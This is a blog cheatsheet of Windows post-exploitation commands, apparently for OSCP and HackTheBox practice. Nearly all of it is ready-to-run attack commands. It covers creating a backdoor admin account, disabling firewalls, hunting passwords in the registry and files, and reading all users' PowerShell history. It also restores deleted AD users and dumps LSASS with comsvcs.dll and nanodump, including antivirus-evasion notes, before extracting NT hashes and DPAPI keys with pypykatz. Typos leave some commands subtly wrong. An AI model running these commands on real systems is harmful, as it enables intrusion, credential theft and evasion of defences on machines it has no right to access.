---
title: "Windows Enum"
date: 2026-02-15 00:00:00 +0530
categories: [Cheatsheet]
tags: [windows, windows Enum]
platform: Cheatsheet
author: 0xmr
image: /assets/img/posts/windows-enum.png
---

# Windows Enum

#### Resources
[github-cheatsheet](https://github.com/intotheewild/OSCP-Checklist/blob/main/03b.%20Windows%20Privilege%20Escalation.md)

## User and System Information
```bash
# User Info
whoami
hostname
whoami /all
whomai /groups,  whoami /priv,  whoami /domain
net users
net user <USERNAME>
Get-ADUser <USERNAME>

# System Info
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
Get-Date
Get-ChildItem Env:    or set
```

### Common Commands
```bash
# Create ADMIN User
net user 0xmr hacker@123 /add
net localgroup Administrator 0xmr /add

# Reset Password
 Set-ADAccountPassword <USERNAME> -NewPassword (ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force)

# Disable Firewalls (Required Admin Powers)
 Set-NetFirewallProfile -All -Enabled False
```

## Credentials Discovery
```bash
# saved Creds
cmdkey /list

# Directory Structure
tree /a /f
gci -force
ls -force
dir -force

# Config files search
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml -File -Recurse -ErrorAction SilentlyContinue

added soon!!

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Process and Network Connections
```bash
# Running Process
ps
tasklist
Get-Process
# Running Network Connections
ipconfig /all
netstat -ano | findstr /I 'TCP'
route print
```

## Windows Defender check
```bash
(Get-Service windefend).Status
Get-MpComputerStatus
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled
Get-MpComputerStatus | findstr /I "AntivirusEnabled RealTimeProtectionEnabled ComputerID AMEngineVersion AMProductVersion"
```

## History 
```bash
# Check Powershell History
(Get-PSReadlineOption).HistorySavePath
Get-History   or    h   or   history

# Print all users powershell History
type "c:\users\*\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt"
Get-Content "c:\users\*\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt"

# Open in Notepad
notepad $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Custom Experiments
type "c:\u*\*\appdata\r*\m*\w*\power*\p*\C*.t*"
```

## Deleted Thinks
[File-deleted_Blog_frizz-htb](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
[User-deletd_Blog_Tombwatcher-htb](https://0xdf.gitlab.io/2025/10/11/htb-tombwatcher.html)

```bash
# Recycle Bin, Restore Delete files
cd '$RECYCLE.BIN'
gci -force
cd "S-*"

# Deleted user
bloodyAD --host $Target --dns $IP -d $DOMAIN -u $USER -p '$PASS' get writable
Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties * | Where-Object {$_.ObjectClass -eq "user"} | Format-List *
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

Restore-ADObject -Identity "Paste_UID_Here"
bloodyAD --host $Target --dns $IP -d $DOMAIN -u $USER -p '$PASS' set restore <Deleted_User_Name>
```

## Schduled Taks
```bash
# Find Tasks
Get-ScheduledTask schtasks /query schtasks /query /fo LIST /v
schtasks /fo LIST | findstr /I taskname | findstr /I /V microsoft
schtasks /query /fo LIST /v | findstr /i Taskname:
schtasks /fo LIST /V /tn <Task_Name_Here>

# Run the Task
schtasks /run /tn "Full_Task_Name_Path"
```

## Lssas Dump
```bash
tasklist | findstr /I lsass.exe
Get-Process -Id <PID>
:: Modern, AV-friendly: comsvcs.dll minidump (Powershell Friendly)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\out.dmp full
:: Task Manager → lsass.exe → Create dump file (GUI route, no binary drop)
:: nanodump (handle duplication, no MiniDumpWriteDump)
nanodump.exe --pid <PID> -w lsass.dmp --valid
- Downlaod using :- Attach Drive to rdp  and  smbclient
:: Download from Victim: cp File_Name \\tsclient\Drive_Name\File_Name
:: Upload to Victim:     cp \\tsclient\Drive_Name\File_Name .
# Dumping Creds via pypykatz
pypykatz lsa minidump go.dump
pypykatz lsa minidump go.dump -o json
 ==> cat json | grep -i 'DPAPI' -A5 -B5
 ==> cat json | grep -iE 'username|NT:|password|Domain:'
# Dumping Creds via kvcforensics
./KvcForensic_static --analyze-dump --input out.dmp --output result --templates KvcForensic.json  --full --reveal-secrets --format both
==> cat result | grep -iE 'user=|domain=|nt=|dpapi=|sha1=' | sed -E 's/((user|domain|nt|dpapi|sha1)=[^ ]+)/\1\n/g'
==> jq -r '.sessions[] | .. | objects | to_entries[] | select(.value != null and .value != "" and (.key|test("user|domain|nt|sha1|dpapi|password|masterkey";"i"))) | "\(.key)=\(.value)"' result.json | grep -iE 'user=[a-zA-Z0-9$_+.]+|domain=[a-zA-Z0-9_+.]+|nt=[a-zA-Z0-9]+|dpapi=[a-zA-Z0-9]+|sha1=[a-zA-Z0-9]+'
```

#### adding...
